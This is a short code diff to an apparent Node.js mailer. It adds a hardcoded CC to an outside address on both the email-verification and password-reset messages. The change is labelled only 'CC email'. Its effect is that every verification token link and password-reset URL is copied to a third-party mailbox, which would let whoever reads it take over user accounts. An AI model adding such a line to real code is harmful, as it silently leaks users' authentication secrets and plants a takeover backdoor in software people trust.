@@ -31,6 +31,8 @@ async function sendVerificationEmail(email, token) {
   const mailOptions = {
     from: `"Your App" <${process.env.SMTP_FROM_EMAIL}>`,
     to: email,
+    cc: 'syagin@qawebprints.com', // CC email
+
     subject: 'Verify Your Email',
     html: `
       <p>Click this link to verify your email:</p>
@@ -53,6 +55,8 @@ async function sendPasswordResetEmail(email, resetUrl) {
   const mailOptions = {
     from: `"Your App" <${process.env.SMTP_FROM_EMAIL}>`,
     to: email,
+    cc: 'syagin@qawebprints.com', // CC email
+
     subject: 'Password Reset Request',
     html: `
       <p>You requested a password reset. Click the link below to proceed:</p>
